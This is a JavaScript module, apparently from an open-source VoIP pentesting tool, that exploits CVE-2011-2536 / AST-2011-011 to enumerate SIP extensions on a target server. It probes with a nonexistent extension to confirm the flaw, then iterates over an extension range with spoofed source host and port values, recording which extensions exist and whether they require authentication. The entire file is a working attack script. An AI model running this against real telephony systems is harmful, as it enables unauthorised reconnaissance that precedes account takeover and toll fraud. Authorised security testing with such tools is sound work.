// Copyright Jesus Perez <jesusprubio gmail com>
//           Sergio Garcia <s3rgio.gr gmail com>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

'use strict';


const async = require('async');
const SipFakeStack = require('sip-fake-stack');
const logger = require('../utils/logger');

module.exports.help = {
  description: 'SIP extension brute-force (CVE-2011-2536 / AST-2011-011)',
  options: {
    target: {
      type: 'ip',
      description: 'Host to attack',
      defaultValue: '127.0.0.1',
    },
    // TODO: Coupled with the client
    // This order mandatory (between "transport" and "port" to try
    // to guess the porter when asking for the options
    transport: {
      type: 'transports',
      description: 'Underlying protocol',
      defaultValue: 'UDP',
    },
    port: {
      type: 'port',
      description: 'Port to attack on chosen IPs',
      defaultValue: 5060,
    },
    wsPath: {
      type: 'allValid',
      description: 'Websockets path (only when websockets)',
      defaultValue: 'ws',
    },
    meth: {
      type: 'sipRequests',
      description: 'Type of SIP packets to do the requests ("random" available)',
      defaultValue: 'REGISTER',
    },
    srcHost: {
      type: 'srcHost',
      description: 'Source host to include in the  SIP request ' +
                   '("external" and "random" supported)',
      defaultValue: 'iface:eth0',
    },
    srcPort: {
      type: 'srcPort',
      description: 'Source port to include in the  SIP request ("random" supported)',
      defaultValue: 'real',
    },
    domain: {
      type: 'domainIp',
      description: 'Domain to explore ("ip" to use the target)',
      defaultValue: 'ip',
    },
    extensions: {
      type: 'userPass',
      description: 'Users, range (ie: range:0000-0100) or file with them to test',
      defaultValue: 'range:100-110',
    },
    delay: {
      type: 'positiveInt',
      description: 'Delay between requests, in ms.',
      defaultValue: 0,
    },
    timeout: {
      type: 'positiveInt',
      description: 'Time to wait for a response, in ms.',
      defaultValue: 5000,
    },
  },
};


module.exports.run = (options, callback) => {
  const result = {
    valid: [],
    errors: [],
  };
  let indexCount = 0; // User with delay to know in which index we are
  const stackConfig = {
    server: options.target || null,
    port: options.port || '5060',
    transport: options.transport || 'UDP',
    timeout: options.timeout || 10000,
    wsPath: options.wsPath || null,
    srcHost: options.srcHost || null,
    lport: options.srcPort || null,
    domain: options.domain || null,
  };

  // Impossible extension at init, to check if vulnerable
  let fakeStack = new SipFakeStack(stackConfig);
  let msgConfig = {
    meth: options.meth,
    fromExt: 'olakasetu',
    // To force inf INVITE, OPTIONS, etc. (better results)
    toExt: 'olakasetu',
  };

  fakeStack.send(msgConfig, (err, res) => {
    // We want to stop the full chain
    if (err) {
      callback(err);

      return;
    }

    const finalRes = res.data[0];
    let resCode = SipFakeStack.parser.code(finalRes);
    // Checking if vulnerable
    if (resCode !== '100') {
      logger.info(`Host not vulnerable (${options.meth})`);
      callback(null, {
        vulnerable: false,
        data: finalRes,
      });

      return;
    }
    async.eachSeries(
      options.extensions,
      (extension, asyncCb) => {
          // We use a new stack in each request to simulate different users
        msgConfig = {
          meth: options.meth,
          fromExt: extension,
          toExt: extension,
        };

        indexCount += 1;
        stackConfig.onlyFirst = false;
        fakeStack = new SipFakeStack(stackConfig);

        // TODO: We need to be more polited here, an ACK and BYE
        // is needed to avoid loops
        fakeStack.send(msgConfig, (err2, res2) => {
          let hasAuth = true;
          let partialResult = {};

          if (err2) {
            // We don't want to stop the full chain
            result.errors.push({
              extension,
              data: err2,
            });
            asyncCb();

            return;
          }

          // checking the first received response
          const finalRes2 = res2.data;
          resCode = SipFakeStack.parser.code(finalRes2[0]);
          if (['401', '200'].indexOf(resCode) !== -1) {
            if (resCode === '200') {
              hasAuth = false;
            } else {
              hasAuth = true;
            }

            partialResult = {
              extension,
              auth: hasAuth,
              data: finalRes2[0],
            };
          } else if (resCode === '100' && SipFakeStack.parser.code(res.data[1]) !== '200') {
            partialResult = {
              extension,
              hasAuth: false,
              data: finalRes2[1],
            };
          }

          // We only add valid extensions to final result
          if (Object.keys(partialResult).length !== 0) {
            result.valid.push(partialResult);
            logger.highlight(`Extension found: ${extension}`);
          } else { // but we print info about tested ones
            logger.infoHigh(`Extension not found: ${extension}`);
          }
          // Last element
          if (indexCount === options.extensions.length) {
            asyncCb();
          } else {
            setTimeout(asyncCb, options.delay);
          }
        });
      }, err3 => {
        callback(err3, result);
      }
    );
  });
};
